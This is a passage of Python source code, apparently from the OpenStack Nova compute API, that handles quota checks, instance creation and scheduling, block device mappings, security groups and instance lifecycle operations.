compute_method, 'args': params}\n        return rpc_method(context, queue, kwargs)\n\n    def _cast_compute_message(self, *args, **kwargs):\n        \"\"\"Generic handler for RPC casts to compute.\"\"\"\n        self._cast_or_call_compute_message(rpc.cast, *args, **kwargs)\n\n    def _call_compute_message(self, *args, **kwargs):\n        \"\"\"Generic handler for RPC calls to compute.\"\"\"\n        return self._cast_or_call_compute_message(rpc.call, *args, **kwargs)\n\n    @staticmethod\n    def _cast_scheduler_message(context, args):\n        \"\"\"Generic handler for RPC calls to the scheduler.\"\"\"\n        rpc.cast(context, FLAGS.scheduler_topic, args)\n\n\nclass API(BaseAPI):\n    \"\"\"API for interacting with the compute manager.\"\"\"\n\n    def __init__(self, image_service=None, network_api=None, volume_api=None,\n                 **kwargs):\n        self.image_service = (image_service or\n                              nova.image.get_default_image_service())\n\n        self.network_api = network_api or network.API()\n        self.volume_api = volume_api or volume.API()\n        self.sgh = utils.import_object(FLAGS.security_group_handler)\n        super(API, self).__init__(**kwargs)\n\n    def _check_injected_file_quota(self, context, injected_files):\n        \"\"\"Enforce quota limits on injected files.\n\n        Raises a QuotaError if any limit is exceeded.\n        \"\"\"\n        if injected_files is None:\n            return\n        limit = quota.allowed_injected_files(context, len(injected_files))\n        if len(injected_files) > limit:\n            raise exception.QuotaError(code=\"OnsetFileLimitExceeded\")\n        path_limit = quota.allowed_injected_file_path_bytes(context)\n        for path, content in injected_files:\n            if len(path) > path_limit:\n                raise exception.QuotaError(code=\"OnsetFilePathLimitExceeded\")\n            content_limit = quota.allowed_injected_file_content_bytes(\n                                                    context, len(content))\n            if len(content) > content_limit:\n                code = \"OnsetFileContentLimitExceeded\"\n                raise exception.QuotaError(code=code)\n\n    def _check_metadata_properties_quota(self, context, metadata=None):\n        \"\"\"Enforce quota limits on metadata properties.\"\"\"\n        if not metadata:\n            metadata = {}\n        num_metadata = len(metadata)\n        quota_metadata = quota.allowed_metadata_items(context, num_metadata)\n        if quota_metadata < num_metadata:\n            pid = context.project_id\n            msg = _(\"Quota exceeded for %(pid)s, tried to set \"\n                    \"%(num_metadata)s metadata properties\") % locals()\n            LOG.warn(msg)\n            raise exception.QuotaError(code=\"MetadataLimitExceeded\")\n\n        # Because metadata is stored in the DB, we hard-code the size limits\n        # In future, we may support more variable length strings, so we act\n        #  as if this is quota-controlled for forwards compatibility\n        for k, v in metadata.iteritems():\n            if len(k) > 255 or len(v) > 255:\n                pid = context.project_id\n                msg = _(\"Quota exceeded for %(pid)s, metadata property \"\n                        \"key or value too long\") % locals()\n                LOG.warn(msg)\n                raise exception.QuotaError(code=\"MetadataLimitExceeded\")\n\n    def _check_requested_networks(self, context, requested_networks):\n        \"\"\" Check if the networks requested belongs to the project\n            and the fixed IP address for each network provided is within\n            same the network block\n        \"\"\"\n        if requested_networks is None:\n            return\n\n        self.network_api.validate_networks(context, requested_networks)\n\n    def _create_instance(self, context, instance_type,\n               image_href, kernel_id, ramdisk_id,\n               min_count, max_count,\n               display_name, display_description,\n               key_name, key_data, security_group,\n               availability_zone, user_data, metadata,\n               injected_files, admin_password,\n               access_ip_v4, access_ip_v6,\n               requested_networks, config_drive,\n               block_device_mapping, auto_disk_config,\n               reservation_id=None, create_instance_here=False,\n               scheduler_hints=None):\n        \"\"\"Verify all the input parameters regardless of the provisioning\n        strategy being performed and schedule the instance(s) for\n        creation.\"\"\"\n\n        if not metadata:\n            metadata = {}\n        if not display_description:\n            display_description = ''\n        if not security_group:\n            security_group = 'default'\n\n        if not instance_type:\n            instance_type = instance_types.get_default_instance_type()\n        if not min_count:\n            min_count = 1\n        if not max_count:\n            max_count = min_count\n        if not metadata:\n            metadata = {}\n\n        block_device_mapping = block_device_mapping or []\n\n        num_instances = quota.allowed_instances(context, max_count,\n                                                instance_type)\n        if num_instances < min_count:\n            pid = context.project_id\n            if num_instances <= 0:\n                msg = _(\"Cannot run any more instances of this type.\")\n            else:\n                msg = (_(\"Can only run %s more instances of this type.\") %\n                       num_instances)\n            LOG.warn(_(\"Quota exceeded for %(pid)s,\"\n                  \" tried to run %(min_count)s instances. \" + msg) % locals())\n            raise exception.QuotaError(code=\"InstanceLimitExceeded\")\n\n        self._check_metadata_properties_quota(context, metadata)\n        self._check_injected_file_quota(context, injected_files)\n        self._check_requested_networks(context, requested_networks)\n\n        (image_service, image_id) = nova.image.get_image_service(context,\n                                                                 image_href)\n        image = image_service.show(context, image_id)\n\n        if instance_type['memory_mb'] < int(image.get('min_ram') or 0):\n            raise exception.InstanceTypeMemoryTooSmall()\n        if instance_type['root_gb'] < int(image.get('min_disk') or 0):\n            raise exception.InstanceTypeDiskTooSmall()\n\n        config_drive_id = None\n        if config_drive and config_drive is not True:\n            # config_drive is volume id\n            config_drive, config_drive_id = None, config_drive\n\n        os_type = None\n        if 'properties' in image and 'os_type' in image['properties']:\n            os_type = image['properties']['os_type']\n        architecture = None\n        if 'properties' in image and 'arch' in image['properties']:\n            architecture = image['properties']['arch']\n        vm_mode = None\n        if 'properties' in image and 'vm_mode' in image['properties']:\n            vm_mode = image['properties']['vm_mode']\n\n        # If instance doesn't have auto_disk_config overridden by request, use\n        # whatever the image indicates\n        if auto_disk_config is None:\n            if ('properties' in image and\n                'auto_disk_config' in image['properties']):\n                auto_disk_config = utils.bool_from_str(\n                    image['properties']['auto_disk_config'])\n\n        if kernel_id is None:\n            kernel_id = image['properties'].get('kernel_id', None)\n        if ramdisk_id is None:\n            ramdisk_id = image['properties'].get('ramdisk_id', None)\n        # FIXME(sirp): is there a way we can remove null_kernel?\n        # No kernel and ramdisk for raw images\n        if kernel_id == str(FLAGS.null_kernel):\n            kernel_id = None\n            ramdisk_id = None\n            LOG.debug(_(\"Creating a raw instance\"))\n        # Make sure we have access to kernel and ramdisk (if not raw)\n        LOG.debug(_(\"Using Kernel=%(kernel_id)s, Ramdisk=%(ramdisk_id)s\")\n                  % locals())\n        if kernel_id:\n            image_service.show(context, kernel_id)\n        if ramdisk_id:\n            image_service.show(context, ramdisk_id)\n        if config_drive_id:\n            image_service.show(context, config_drive_id)\n\n        self.ensure_default_security_group(context)\n\n        if key_data is None and key_name:\n            key_pair = self.db.key_pair_get(context, context.user_id, key_name)\n            key_data = key_pair['public_key']\n\n        if reservation_id is None:\n            reservation_id = utils.generate_uid('r')\n\n        root_device_name = block_device.properties_root_device_name(\n            image['properties'])\n\n        # NOTE(vish): We have a legacy hack to allow admins to specify hosts\n        #             via az using az:host. It might be nice to expose an\n        #             api to specify specific hosts to force onto, but for\n        #             now it just supports this legacy hack.\n        host = None\n        if availability_zone:\n            availability_zone, _x, host = availability_zone.partition(':')\n        if not availability_zone:\n            availability_zone = FLAGS.default_schedule_zone\n        if context.is_admin and host:\n            filter_properties = {'force_hosts': [host]}\n        else:\n            filter_properties = {}\n\n        filter_properties['scheduler_hints'] = scheduler_hints\n\n        base_options = {\n            'reservation_id': reservation_id,\n            'image_ref': image_href,\n            'kernel_id': kernel_id or '',\n            'ramdisk_id': ramdisk_id or '',\n            'power_state': power_state.NOSTATE,\n            'vm_state': vm_states.BUILDING,\n            'config_drive_id': config_drive_id or '',\n            'config_drive': config_drive or '',\n            'user_id': context.user_id,\n            'project_id': context.project_id,\n            'launch_time': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),\n            'instance_type_id': instance_type['id'],\n            'memory_mb': instance_type['memory_mb'],\n            'vcpus': instance_type['vcpus'],\n            'root_gb': instance_type['root_gb'],\n            'ephemeral_gb': instance_type['ephemeral_gb'],\n            'display_name': display_name,\n            'display_description': display_description,\n            'user_data': user_data or '',\n            'key_name': key_name,\n            'key_data': key_data,\n            'locked': False,\n            'metadata': metadata,\n            'access_ip_v4': access_ip_v4,\n            'access_ip_v6': access_ip_v6,\n            'availability_zone': availability_zone,\n            'os_type': os_type,\n            'architecture': architecture,\n            'vm_mode': vm_mode,\n            'root_device_name': root_device_name,\n            'progress': 0,\n            'auto_disk_config': auto_disk_config}\n\n        LOG.debug(_(\"Going to run %s instances...\") % num_instances)\n\n        # Validate the correct devices have been specified\n        for bdm in block_device_mapping:\n            # NOTE(vish): For now, just make sure the volumes are accessible.\n            snapshot_id = bdm.get('snapshot_id')\n            volume_id = bdm.get('volume_id')\n            if volume_id is not None:\n                try:\n                    self.volume_api.get(context, volume_id)\n                except Exception:\n                    raise exception.InvalidBDMVolume(id=volume_id)\n            elif snapshot_id is not None:\n                try:\n                    self.volume_api.get_snapshot(context, snapshot_id)\n                except Exception:\n                    raise exception.InvalidBDMSnapshot(id=snapshot_id)\n\n        if create_instance_here:\n            instance = self.create_db_entry_for_new_instance(\n                    context, instance_type, image, base_options,\n                    security_group, block_device_mapping)\n            # Tells scheduler we created the instance already.\n            base_options['uuid'] = instance['uuid']\n            rpc_method = rpc.cast\n        else:\n            # We need to wait for the scheduler to create the instance\n            # DB entries, because the instance *could* be # created in\n            # a child zone.\n            rpc_method = rpc.call\n\n        # TODO(comstud): We should use rpc.multicall when we can\n        # retrieve the full instance dictionary from the scheduler.\n        # Otherwise, we could exceed the AMQP max message size limit.\n        # This would require the schedulers' schedule_run_instances\n        # methods to return an iterator vs a list.\n        instances = self._schedule_run_instance(\n                rpc_method,\n                context, base_options,\n                instance_type,\n                availability_zone, injected_files,\n                admin_password, image,\n                num_instances, requested_networks,\n                block_device_mapping, security_group,\n                filter_properties)\n\n        if create_instance_here:\n            return ([instance], reservation_id)\n        return (instances, reservation_id)\n\n    @staticmethod\n    def _volume_size(instance_type, virtual_name):\n        size = 0\n        if virtual_name == 'swap':\n            size = instance_type.get('swap', 0)\n        elif block_device.is_ephemeral(virtual_name):\n            num = block_device.ephemeral_num(virtual_name)\n\n            # TODO(yamahata): ephemeralN where N > 0\n            # Only ephemeral0 is allowed for now because InstanceTypes\n            # table only allows single local disk, ephemeral_gb.\n            # In order to enhance it, we need to add a new columns to\n            # instance_types table.\n            if num > 0:\n                return 0\n\n            size = instance_type.get('ephemeral_gb')\n\n        return size\n\n    def _update_image_block_device_mapping(self, elevated_context,\n                                           instance_type, instance_id,\n                                           mappings):\n        \"\"\"tell vm driver to create ephemeral/swap device at boot time by\n        updating BlockDeviceMapping\n        \"\"\"\n        instance_type = (instance_type or\n                         instance_types.get_default_instance_type())\n\n        for bdm in block_device.mappings_prepend_dev(mappings):\n            LOG.debug(_(\"bdm %s\"), bdm)\n\n            virtual_name = bdm['virtual']\n            if virtual_name == 'ami' or virtual_name == 'root':\n                continue\n\n            if not block_device.is_swap_or_ephemeral(virtual_name):\n                continue\n\n            size = self._volume_size(instance_type, virtual_name)\n            if size == 0:\n                continue\n\n            values = {\n                'instance_id': instance_id,\n                'device_name': bdm['device'],\n                'virtual_name': virtual_name,\n                'volume_size': size}\n            self.db.block_device_mapping_update_or_create(elevated_context,\n                                                          values)\n\n    def _update_block_device_mapping(self, elevated_context,\n                                     instance_type, instance_id,\n                                     block_device_mapping):\n        \"\"\"tell vm driver to attach volume at boot time by updating\n        BlockDeviceMapping\n        \"\"\"\n        LOG.debug(_(\"block_device_mapping %s\"), block_device_mapping)\n        for bdm in block_device_mapping:\n            assert 'device_name' in bdm\n\n            values = {'instance_id': instance_id}\n            for key in ('device_name', 'delete_on_termination', 'virtual_name',\n                        'snapshot_id', 'volume_id', 'volume_size',\n                        'no_device'):\n                values[key] = bdm.get(key)\n\n            virtual_name = bdm.get('virtual_name')\n            if (virtual_name is not None and\n                block_device.is_swap_or_ephemeral(virtual_name)):\n                size = self._volume_size(instance_type, virtual_name)\n                if size == 0:\n                    continue\n                values['volume_size'] = size\n\n            # NOTE(yamahata): NoDevice eliminates devices defined in image\n            #                 files by command line option.\n            #                 (--block-device-mapping)\n            if virtual_name == 'NoDevice':\n                values['no_device'] = True\n                for k in ('delete_on_termination', 'volume_id',\n                          'snapshot_id', 'volume_id', 'volume_size',\n                          'virtual_name'):\n                    values[k] = None\n\n            self.db.block_device_mapping_update_or_create(elevated_context,\n                                                          values)\n\n    #NOTE(bcwaldon): No policy check since this is only used by scheduler and\n    # the compute api. That should probably be cleaned up, though.\n    def create_db_entry_for_new_instance(self, context, instance_type, image,\n            base_options, security_group, block_device_mapping):\n        \"\"\"Create an entry in the DB for this new instance,\n        including any related table updates (such as security group,\n        etc).\n\n        This is called by the scheduler after a location for the\n        instance has been determined.\n        \"\"\"\n        elevated = context.elevated()\n        if security_group is None:\n            security_group = ['default']\n        if not isinstance(security_group, list):\n            security_group = [security_group]\n\n        security_groups = []\n        for security_group_name in security_group:\n            group = self.db.security_group_get_by_name(context,\n                    context.project_id,\n                    security_group_name)\n            security_groups.append(group['id'])\n\n        base_options.setdefault('launch_index', 0)\n        instance = self.db.instance_create(context, base_options)\n        instance_id = instance['id']\n        instance_uuid = instance['uuid']\n\n        for security_group_id in security_groups:\n            self.db.instance_add_security_group(elevated,\n                                                instance_uuid,\n                                                security_group_id)\n\n        # BlockDeviceMapping table\n        self._update_image_block_device_mapping(elevated, instance_type,\n            instance_id, image['properties'].get('mappings', []))\n        self._update_block_device_mapping(elevated, instance_type, instance_id,\n            image['properties'].get('block_device_mapping', []))\n        # override via command line option\n        self._update_block_device_mapping(elevated, instance_type, instance_id,\n                                          block_device_mapping)\n\n        # Set sane defaults if not specified\n        updates = {}\n\n        display_name = instance.get('display_name')\n        if display_name is None:\n            display_name = self._default_display_name(instance_id)\n\n        hostname = instance.get('hostname')\n        if hostname is None:\n            hostname = display_name\n\n        updates['display_name'] = display_name\n        updates['hostname'] = utils.sanitize_hostname(hostname)\n        updates['vm_state'] = vm_states.BUILDING\n        updates['task_state'] = task_states.SCHEDULING\n\n        if (image['properties'].get('mappings', []) or\n            image['properties'].get('block_device_mapping', []) or\n            block_device_mapping):\n            updates['shutdown_terminate'] = False\n\n        instance = self.update(context, instance, **updates)\n        return instance\n\n    def _default_display_name(self, instance_id):\n        return \"Server %s\" % instance_id\n\n    def _schedule_run_instance(self,\n            rpc_method,\n            context, base_options,\n            instance_type,\n            availability_zone, injected_files,\n            admin_password, image,\n            num_instances,\n            requested_networks,\n            block_device_mapping,\n            security_group,\n            filter_properties):\n        \"\"\"Send a run_instance request to the schedulers for processing.\"\"\"\n\n        pid = context.project_id\n        uid = context.user_id\n\n        LOG.debug(_(\"Sending create to scheduler for %(pid)s/%(uid)s's\") %\n                locals())\n\n        request_spec = {\n            'image': utils.to_primitive(image),\n            'instance_properties': base_options,\n            'instance_type': instance_type,\n            'num_instances': num_instances,\n            'block_device_mapping': block_device_mapping,\n            'security_group': security_group,\n        }\n\n        return rpc_method(context,\n                FLAGS.scheduler_topic,\n                {\"method\": \"run_instance\",\n                 \"args\": {\"topic\": FLAGS.compute_topic,\n                          \"request_spec\": request_spec,\n                          \"admin_password\": admin_password,\n                          \"injected_files\": injected_files,\n                          \"requested_networks\": requested_networks,\n                          \"is_first_time\": True,\n                          \"filter_properties\": filter_properties}})\n\n    def _check_create_policies(self, context, availability_zone,\n            requested_networks, block_device_mapping):\n        \"\"\"Check policies for create().\"\"\"\n        target = {'project_id': context.project_id,\n                  'user_id': context.user_id,\n                  'availability_zone': availability_zone}\n        check_policy(context, 'create', target)\n\n        if requested_networks:\n            check_policy(context, 'create:attach_network', target)\n\n        if block_device_mapping:\n            check_policy(context, 'create:attach_volume', target)\n\n    def create(self, context, instance_type,\n               image_href, kernel_id=None, ramdisk_id=None,\n               min_count=None, max_count=None,\n               display_name=None, display_description=None,\n               key_name=None, key_data=None, security_group=None,\n               availability_zone=None, user_data=None, metadata=None,\n               injected_files=None, admin_password=None,\n               block_device_mapping=None, access_ip_v4=None,\n               access_ip_v6=None, requested_networks=None, config_drive=None,\n               auto_disk_config=None, scheduler_hints=None):\n        \"\"\"\n        Provision instances, sending instance information to the\n        scheduler.  The scheduler will determine where the instance(s)\n        go and will handle creating the DB entries.\n\n        Returns a tuple of (instances, reservation_id) where instances\n        could be 'None' or a list of instance dicts depending on if\n        we waited for information from the scheduler or not.\n        \"\"\"\n\n        self._check_create_policies(context, availability_zone,\n                requested_networks, block_device_mapping)\n\n        # We can create the DB entry for the instance here if we're\n        # only going to create 1 instance.\n        # This speeds up API responses for builds\n        # as we don't need to wait for the scheduler.\n        create_instance_here = max_count == 1\n\n        (instances, reservation_id) = self._create_instance(\n                               context, instance_type,\n                               image_href, kernel_id, ramdisk_id,\n                               min_count, max_count,\n                               display_name, display_description,\n                               key_name, key_data, security_group,\n                               availability_zone, user_data, metadata,\n                               injected_files, admin_password,\n                               access_ip_v4, access_ip_v6,\n                               requested_networks, config_drive,\n                               block_device_mapping, auto_disk_config,\n                               create_instance_here=create_instance_here,\n                               scheduler_hints=scheduler_hints)\n\n        if create_instance_here or instances is None:\n            return (instances, reservation_id)\n\n        inst_ret_list = []\n        for instance in instances:\n            if instance.get('_is_precooked', False):\n                inst_ret_list.append(instance)\n            else:\n                # Scheduler only gives us the 'id'.  We need to pull\n                # in the created instances from the DB\n                instance = self.db.instance_get(context, instance['id'])\n                inst_ret_list.append(dict(instance.iteritems()))\n\n        return (inst_ret_list, reservation_id)\n\n    def ensure_default_security_group(self, context):\n        \"\"\"Ensure that a context has a security group.\n\n        Creates a security group for the security context if it does not\n        already exist.\n\n        :param context: the security context\n        \"\"\"\n        try:\n            self.db.security_group_get_by_name(context,\n                                               context.project_id,\n                                               'default')\n        except exception.NotFound:\n            values = {'name': 'default',\n                      'description': 'default',\n                      'user_id': context.user_id,\n                      'project_id': context.project_id}\n            self.db.security_group_create(context, values)\n            self.sgh.trigger_security_group_create_refresh(context, values)\n\n    def trigger_security_group_rules_refresh(self, context, security_group_id):\n        \"\"\"Called when a rule is added to or removed from a security_group.\"\"\"\n\n        security_group = self.db.security_group_get(context, security_group_id)\n\n        hosts = set()\n        for instance in security_group['instances']:\n            if instance['host'] is not None:\n                hosts.add(instance['host'])\n\n        for host in hosts:\n            rpc.cast(context,\n                     self.db.queue_get_for(context, FLAGS.compute_topic, host),\n                     {\"method\": \"refresh_security_group_rules\",\n                      \"args\": {\"security_group_id\": security_group.id}})\n\n    def trigger_security_group_members_refresh(self, context, group_ids):\n        \"\"\"Called when a security group gains a new or loses a member.\n\n        Sends an update request to each compute node for whom this is\n        relevant.\n        \"\"\"\n        # First, we get the security group rules that reference these groups as\n        # the grantee..\n        security_group_rules = set()\n        for group_id in group_ids:\n            security_group_rules.update(\n                self.db.security_group_rule_get_by_security_group_grantee(\n                                                                     context,\n                                                                     group_id))\n\n        # ..then we distill the security groups to which they belong..\n        security_groups = set()\n        for rule in security_group_rules:\n            security_group = self.db.security_group_get(\n                                                    context,\n                                                    rule['parent_group_id'])\n            security_groups.add(security_group)\n\n        # ..then we find the instances that are members of these groups..\n        instances = set()\n        for security_group in security_groups:\n            for instance in security_group['instances']:\n                instances.add(instance)\n\n        # ...then we find the hosts where they live...\n        hosts = set()\n        for instance in instances:\n            if instance['host']:\n                hosts.add(instance['host'])\n\n        # ...and finally we tell these nodes to refresh their view of this\n        # particular security group.\n        for host in hosts:\n            rpc.cast(context,\n                     self.db.queue_get_for(context, FLAGS.compute_topic, host),\n                     {\"method\": \"refresh_security_group_members\",\n                      \"args\": {\"security_group_id\": group_id}})\n\n    def trigger_provider_fw_rules_refresh(self, context):\n        \"\"\"Called when a rule is added/removed from a provider firewall\"\"\"\n\n        hosts = [x['host'] for (x, idx)\n                           in self.db.service_get_all_compute_sorted(context)]\n        for host in hosts:\n            rpc.cast(context,\n                     self.db.queue_get_for(context, FLAGS.compute_topic, host),\n                     {'method': 'refresh_provider_fw_rules', 'args': {}})\n\n    def _is_security_group_associated_with_server(self, security_group,\n                                                  instance_uuid):\n        \"\"\"Check if the security group is already associated\n           with the instance. If Yes, return True.\n        \"\"\"\n\n        if not security_group:\n            return False\n\n        instances = security_group.get('instances')\n        if not instances:\n            return False\n\n        for inst in instances:\n            if (instance_uuid == inst['uuid']):\n                return True\n\n        return False\n\n    @wrap_check_policy\n    def add_security_group(self, context, instance, security_group_name):\n        \"\"\"Add security group to the instance\"\"\"\n        security_group = self.db.security_group_get_by_name(context,\n                context.project_id,\n                security_group_name)\n\n        instance_uuid = instance['uuid']\n\n        #check if the security group is associated with the server\n        if self._is_security_group_associated_with_server(security_group,\n                                                          instance_uuid):\n            raise exception.SecurityGroupExistsForInstance(\n                                        security_group_id=security_group['id'],\n                                        instance_id=instance_uuid)\n\n        #check if the instance is in running state\n        if instance['power_state'] != power_state.RUNNING:\n            raise exception.InstanceNotRunning(instance_id=instance_uuid)\n\n        self.db.instance_add_security_group(context.elevated(),\n                                            instance_uuid,\n                                            security_group['id'])\n        params = {\"security_group_id\": security_group['id']}\n        # NOTE(comstud): No instance_uuid argument to this compute manager\n        # call\n        self._cast_compute_message('refresh_security_group_rules',\n                context, host=instance['host'], params=params)\n\n    @wrap_check_policy\n    def remove_security_group(self, context, instance, security_group_name):\n        \"\"\"Remove the security group associated with the instance\"\"\"\n        security_group = self.db.security_group_get_by_name(context,\n                context.project_id,\n                security_group_name)\n\n        instance_uuid = instance['uuid']\n\n        #check if the security group is associated with the server\n        if not self._is_security_group_associated_with_server(security_group,\n                                                              instance_uuid):\n            raise exception.SecurityGroupNotExistsForInstance(\n                                    security_group_id=security_group['id'],\n                                    instance_id=instance_uuid)\n\n        #check if the instance is in running state\n        if instance['power_state'] != power_state.RUNNING:\n            raise exception.InstanceNotRunning(instance_id=instance_uuid)\n\n        self.db.instance_remove_security_group(context.elevated(),\n                                               instance_uuid,\n                                               security_group['id'])\n        params = {\"security_group_id\": security_group['id']}\n        # NOTE(comstud): No instance_uuid argument to this compute manager\n        # call\n        self._cast_compute_message('refresh_security_group_rules',\n                context, host=instance['host'], params=params)\n\n    @wrap_check_policy\n    def update(self, context, instance, **kwargs):\n        \"\"\"Updates the instance in the datastore.\n\n        :param context: The security context\n        :param instance: The instance to update\n        :param kwargs: All additional keyword args are treated\n                       as data fields of the instance to be\n                       updated\n\n        :returns: None\n        \"\"\"\n        rv = self.db.instance_update(context, instance[\"id\"], kwargs)\n        return dict(rv.iteritems())\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.ACTIVE, vm_states.SHUTOFF,\n                                    vm_states.ERROR])\n    def soft_delete(self, context, instance):\n        \"\"\"Terminate an instance.\"\"\"\n        LOG.debug(_('Going to try to soft delete instance'),\n                  instance=instance)\n\n        if instance['disable_terminate']:\n            return\n\n        # NOTE(jerdfelt): The compute daemon handles reclaiming instances\n        # that are in soft delete. If there is no host assigned, there is\n        # no daemon to reclaim, so delete it immediately.\n        host = instance['host']\n        if host:\n            self.update(context,\n                        instance,\n                        vm_state=vm_states.SOFT_DELETE,\n                        task_state=task_states.POWERING_OFF,\n                        deleted_at=utils.utcnow())\n\n            self._cast_compute_message('power_off_instance',\n                    context, instance)\n        else:\n            LOG.warning(_('No host for instance, deleting immediately'),\n                        instance=instance)\n            try:\n                self.db.instance_destroy(context, instance['id'])\n            except exception.InstanceNotFound:\n                # NOTE(comstud): Race condition.  Instance already gone.\n                pass\n\n    def _delete(self, context, instance):\n        host = instance['host']\n        try:\n            if host:\n                self.update(context,\n                            instance,\n                            task_state=task_states.DELETING,\n                            progress=0)\n\n                self._cast_compute_message('terminate_instance',\n                        context, instance)\n            else:\n                self.db.instance_destroy(context, instance['id'])\n        except exception.InstanceNotFound:\n            # NOTE(comstud): Race condition. Instance already gone.\n            pass\n\n    # NOTE(jerdfelt): The API implies that only ACTIVE and ERROR are\n    # allowed but the EC2 API appears to allow from RESCUED and STOPPED\n    # too\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.ACTIVE, vm_states.BUILDING,\n                                    vm_states.ERROR, vm_states.RESCUED,\n                                    vm_states.SHUTOFF, vm_states.STOPPED])\n    def delete(self, context, instance):\n        \"\"\"Terminate an instance.\"\"\"\n        LOG.debug(_(\"Going to try to terminate instance\"), instance=instance)\n\n        if instance['disable_terminate']:\n            return\n\n        self._delete(context, instance)\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.SOFT_DELETE])\n    def restore(self, context, instance):\n        \"\"\"Restore a previously deleted (but not reclaimed) instance.\"\"\"\n        self.update(context,\n                    instance,\n                    vm_state=vm_states.ACTIVE,\n                    task_state=None,\n                    deleted_at=None)\n\n        host = instance['host']\n        if host:\n            self.update(context,\n                        instance,\n                        task_state=task_states.POWERING_ON)\n            self._cast_compute_message('power_on_instance',\n                    context, instance)\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.SOFT_DELETE])\n    def force_delete(self, context, instance):\n        \"\"\"Force delete a previously deleted (but not reclaimed) instance.\"\"\"\n        self._delete(context, instance)\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.ACTIVE, vm_states.SHUTOFF,\n                                    vm_states.RESCUED],\n                          task_state=[None, task_states.RESIZE_VERIFY])\n    def stop(self, context, instance, do_cast=True):\n        \"\"\"Stop an instance.\"\"\"\n        instance_uuid = instance[\"uuid\"]\n        LOG.debug(_(\"Going to try to stop instance\"), instance=instance)\n\n        self.update(context,\n                    instance,\n                    vm_state=vm_states.ACTIVE,\n                    task_state=task_states.STOPPING,\n                    terminated_at=utils.utcnow(),\n                    progress=0)\n\n        rpc_method = rpc.cast if do_cast else rpc.call\n        self._cast_or_call_compute_message(rpc_method, 'stop_instance',\n                context, instance)\n\n    @wrap_check_policy\n    @check_instance_state(vm_state=[vm_states.STOPPED, vm_states.SHUTOFF])\n    def start(self, context, instance):\n        \"\"\"Start an instance.\"\"\"\n        vm_state = instance[\"vm_state\"]\n        instance_uuid = instance[\"uuid\"]\n        LOG.debug(_(\"Going to try to start instance\"), instance=instance)\n\n        if vm_state == vm_states.SHUTOFF:\n            if instance['shutdown_terminate']:\n                LOG.warning(_(\"Instance %(instance_uuid)s is not \"\n                              \"stopped. (%(vm_state)s\") % locals())\n                return\n\n            # NOTE(yamahata): nova compute doesn't reap instances\n            # which initiated shutdown itself. So reap it here.\n            self.stop(context, instance, do_cast=False)\n\n        self.update(context,\n                    instance,\n                    vm_state=vm_states.STOPPED,\n                    task_state=task_states.STARTING)\n\n        # TODO(yamahata): injected_files isn't supported right now.\n        #                 It is used only for osapi. not for ec2 api.\n        #                 availability_zone isn't used by run_instance.\n        self._cast_compute_message('start_instance', context, instance)\n\n    #NOTE(bcwaldon): no policy check here since it should be rolled in to\n    # search_opts in get_all\n    def get_active_by_window(self, context, begin, end=None, project_id=None):\n        \"\"\"Get instances that were continuously active over a window.\"\"\"\n        return self.db.instance_get_active_by_window(context, begin, end,\n                                                     project_id)\n\n    #NOTE(bcwaldon): this doesn't really belong in this class\n    def get_instance_type(self, context, instance_type_id):\n        \"\"\"Get an instance type by instance type id.\"\"\"\n        return instance_types.get_instance_type(instance_type_id)\n\n    def get(self, context, instance_id):\n        \"\"\"Get a single instance with the given instance_id.\"\"\"\n        # NOTE(ameade): we still need to support integer ids for ec2\n        if utils.is_uuid_like(instance_id):\n            instance = self.db.instance_get_by_uuid(context, instance_id)\n        else:\n            instance = self.db.instance_get(context, instance_id)\n\n        check_policy(context, 'get', instance)\n\n        inst = dict(instance.iteritems())\n        # NOTE(comstud): Doesn't get returned with iteritems\n        inst['name'] = instance['name']\n        return inst\n\n    def get_all(self, context, search_opts=None, sort_key='created_at',\n                sort_dir='desc'):\n        \"\"\"Get all instances filtered by one of the given parameters.\n\n        If there is no filter and the context is an admin, it will retrieve\n        all instances in the system.\n\n        Deleted instances will be returned by default, unless there is a\n        search option that says otherwise.\n\n        The results will be returned sorted in the order specified by the\n        'sort_dir' parameter using the key specified in the 'sort_key'\n        parameter.\n        \"\"\"\n\n        #TODO(bcwaldon): determine the best argument for target here\n        target = {\n            'project_id': context.project_id,\n            'user_id': context.user_id,\n        }\n\n        check_policy(context, \"get_all\", target)\n\n        if search_opts is None:\n            search_opts = {}\n\n        LOG.debug(_(\"Searching by: %s\") % str(search_opts))\n\n        # Fixups for the DB call\n        filters = {}\n\n        def _remap_flavor_filter(flavor_id):\n            try:\n                instance_type = instance_types.get_instance_type_by_flavor_id(\n                        flavor_id)\n            except exception.FlavorNotFound:\n                raise ValueError()\n\n            filters['instance_type_id'] = instance_type['id']\n\n        def _remap_fixed_ip_filter(fixed_ip):\n            # Turn fixed_ip into a regexp match. Since '.' matches\n            # any character, we need to use regexp escaping for it.\n            filters['ip'] = '^%s$' % fixed_ip.replace('.', '\\\\.')\n\n        # search_option to filter_name mapping.\n        filter_mapping = {\n                'image': 'image_ref',\n                'name': 'display_name',\n                'instance_name': 'name',\n                'tenant_id': 'project_id',\n                'flavor': _remap_flavor_filter,\n                'fixed_ip': _remap_fixed_ip_filter}\n\n        # copy from search_opts, doing various remappings as necessary\n        for opt, value in search_opts.iteritems():\n            # Do remappings.\n            # Values not in the filter_mapping table are copied as-is.\n            # If remapping is None, option is not copied\n            # If the remapping is a string, it is the filter_name to use\n            try:\n                remap_object = filter_mapping[opt]\n            except KeyError:\n                filters[opt] = value\n            else:\n                # Remaps are strings to translate to, or functions to call\n                # to do the translating as defined by the table above.\n                if isinstance(remap_object, basestring):\n                    filters[remap_object] = value\n                else:\n                    try:\n                        remap_object(value)\n\n                    # We already know we can't match the filter, so\n                    # return an empty list\n                    except ValueError:\n                        return []\n\n        inst_models = self._get_instances_by_filters(context, filters,\n                                                     sort_key, sort_dir)\n\n        # Convert the models to dictionaries\n        instances = []\n        for inst_model in inst_models:\n            instance = dict(inst_model.iteritems())\n            # NOTE(comstud): Doesn't get returned by iteritems\n            instance['name'] = inst_model['name']\n            instances.append(instance)\n\n        return instances\n\n    def _get_instances_by_filters(self, context, filters, sort_key, sort_dir):\n        if 'ip6' in filters or 'ip' in filters:\n            res = self.network_api.get_instance_uuids_by_ip_filter(context,\n                                                                   filters)\n            # NOTE(jkoelker) It is possible that we will get the same\n            